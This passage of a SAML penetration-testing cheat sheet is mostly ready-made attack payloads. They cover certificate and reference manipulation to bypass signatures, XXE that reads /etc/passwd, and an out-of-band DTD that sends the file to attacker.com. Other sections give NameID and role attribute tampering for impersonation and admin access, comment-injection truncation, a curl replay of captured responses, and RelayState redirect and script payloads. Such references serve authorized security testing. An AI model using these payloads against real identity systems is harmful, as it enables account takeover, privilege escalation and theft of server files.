<signature_validation_bypass>
{% raw %}
# Certificate validation issues

# 1. Self-signed certificate
# Replace IdP certificate with self-signed
# Sign response with attacker's private key

# 2. Certificate not validated
# Use any certificate that SP doesn't verify

# 3. KeyInfo manipulation
# Inject certificate in KeyInfo
<ds:KeyInfo>
  <ds:X509Data>
    <ds:X509Certificate>ATTACKER_CERT_BASE64</ds:X509Certificate>
  </ds:X509Data>
</ds:KeyInfo>

# 4. Reference URI manipulation
# Change what the signature covers
<ds:Reference URI="#_wrong_id">
{% endraw %}
</signature_validation_bypass>
</signature_attacks>

<xxe_attacks>
<xxe_in_saml>
{% raw %}
# XXE in SAML Response/Request processing

# Basic XXE
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="xxe">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>

# OOB XXE (Out-of-Band)
<!DOCTYPE samlp:Response [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>

# External DTD (xxe.dtd):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

# Parameter entity injection
<!DOCTYPE samlp:Response [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
{% endraw %}
</xxe_in_saml>

<xxe_locations>
{% raw %}
# Test XXE in multiple locations:

# 1. SAML Response body
# 2. SAML Request (AuthnRequest)
# 3. Logout Request
# 4. Artifact Resolution
# 5. Metadata endpoints

# Base64 decode, inject XXE, re-encode
# For POST binding: SAMLResponse form field
# For Redirect binding: SAMLRequest/SAMLResponse URL param (also DEFLATE)
{% endraw %}
</xxe_locations>
</xxe_attacks>

<assertion_manipulation>
<subject_manipulation>
{% raw %}
# Modify NameID to impersonate another user

<!-- Original -->
<saml:NameID>user@example.com</saml:NameID>

<!-- Modified -->
<saml:NameID>admin@example.com</saml:NameID>
<saml:NameID>root@example.com</saml:NameID>
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">victim@example.com</saml:NameID>

# Test different NameID formats
# - urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress
# - urn:oasis:names:tc:SAML:2.0:nameid-format:persistent
# - urn:oasis:names:tc:SAML:2.0:nameid-format:transient
{% endraw %}
</subject_manipulation>

<attribute_manipulation>
{% raw %}
# Modify or add attributes

<!-- Add admin role -->
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>

<!-- Add group membership -->
<saml:Attribute Name="memberOf">
  <saml:AttributeValue>cn=admins,ou=groups,dc=example,dc=com</saml:AttributeValue>
</saml:Attribute>

<!-- Modify email for account takeover -->
<saml:Attribute Name="email">
  <saml:AttributeValue>attacker@evil.com</saml:AttributeValue>
</saml:Attribute>

<!-- Add custom attributes -->
<saml:Attribute Name="isAdmin">
  <saml:AttributeValue>true</saml:AttributeValue>
</saml:Attribute>
{% endraw %}
</attribute_manipulation>

<conditions_bypass>
{% raw %}
# Bypass time-based conditions

<!-- Extend validity -->
<saml:Conditions 
  NotBefore="2020-01-01T00:00:00Z" 
  NotOnOrAfter="2030-12-31T23:59:59Z">

<!-- Remove conditions entirely -->
<!-- Some SPs may not enforce -->

<!-- Modify audience -->
<saml:AudienceRestriction>
  <saml:Audience>https://different-sp.example.com</saml:Audience>
</saml:AudienceRestriction>
{% endraw %}
</conditions_bypass>
</assertion_manipulation>

<comment_injection>
<nameId_truncation>
{% raw %}
# Comment injection to truncate NameID

<!-- Original verification might see: admin@example.com -->
<!-- But application processes: admin -->

<saml:NameID>admin<!-- comment -->@example.com</saml:NameID>

# Or
<saml:NameID>admin<!---->@example.com</saml:NameID>

# Various comment positions:
<saml:NameID>admin@example.com<!--.attacker.com--></saml:NameID>
<saml:NameID><!--victim-->attacker@example.com</saml:NameID>
{% endraw %}
</nameId_truncation>

<attribute_truncation>
{% raw %}
# Comment injection in attributes

<saml:AttributeValue>admin<!-- ignored --></saml:AttributeValue>
<saml:AttributeValue><!--prefix-->value</saml:AttributeValue>
{% endraw %}
</attribute_truncation>
</comment_injection>

<replay_attacks>
<response_replay>
{% raw %}
# Replay a captured SAML Response

# 1. Capture valid SAML Response
# 2. Extract SAMLResponse parameter
# 3. Submit to ACS endpoint again

curl -X POST https://sp.example.com/saml/acs \
  -d "SAMLResponse=CAPTURED_BASE64_RESPONSE" \
  -d "RelayState=ORIGINAL_RELAY_STATE"

# Effective if:
# - InResponseTo not validated
# - NotOnOrAfter not enforced
# - Response ID not tracked for replay prevention
{% endraw %}
</response_replay>

<relay_state_manipulation>
{% raw %}
# Manipulate RelayState for redirect attacks

# Original
RelayState=/dashboard

# Modified for open redirect
RelayState=https://attacker.com

# XSS via RelayState (if reflected without encoding)
RelayState=javascript:alert(1)
RelayState=<script>alert(1)</script>

# Path traversal
RelayState=/admin
RelayState=/../../admin
{% endraw %}
</relay_state_manipulation>
</replay_attacks>

<idp_initiated_attacks>
<unsolicited_response>
{% raw %}
# IdP-initiated SSO vulnerabilities

# Send SAML Response without prior AuthnRequest
# If SP accepts unsolicited responses:

# 1. Craft malicious SAML Response
# 2. Send directly to SP's ACS
# 3. If signature not required or can be bypassed, gain access

# Test with InResponseTo:
# - Missing InResponseTo
# - Invalid InResponseTo
# - InResponseTo referencing non-existent request
{% endraw %}
</unsolicited_response>

<destination_bypass>
{% raw %}
# Destination validation bypass

<!-- Response intended for different SP -->
<samlp:Response 
  Destination="https://different-sp.example.com/saml/acs">

<!-- No destination specified -->
<samlp:Response>  <!-- Missing Destination -->

<!-- Destination with variations -->
<samlp:Response 
  Destination="https://sp.example.com/saml/acs/../admin">
{% endraw %}
</destination_bypass>
</idp_initiated_attacks>

<binding_attacks>
<redirect_binding>
{% raw %}
# HTTP-Redirect binding attacks

# SAMLRequest/SAMLResponse is:
# 1. Compressed (DEFLATE)
# 2. Base64 encoded
# 3. URL encoded
# 4. In query parameter

# Signature in query parameter (if signed)
?SAMLRequest=...&SigAlg=...&Signature=...

# Test signature removal
# Remove Signature parameter from URL

# Signature algorithm manipulation
SigAlg=http://www.w3.org/2000/09/xmldsig#rsa-sha1
SigAlg=http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
{% endraw %}
</redirect_binding>

<post_binding>
{% raw %}
# HTTP-POST binding

# SAMLResponse in form field (Base64 only, no DEFLATE)
<form action="https://sp.example.com/saml/acs" method="POST">
  <input name="SAMLResponse" value="BASE64_RESPONSE"/>
  <input name="RelayState" value="/dashboard"/>
</form>

# Submit modified responses via POST
# Easier to manipulate than redirect binding
{% endraw %}
</post_binding>
</binding_attacks>

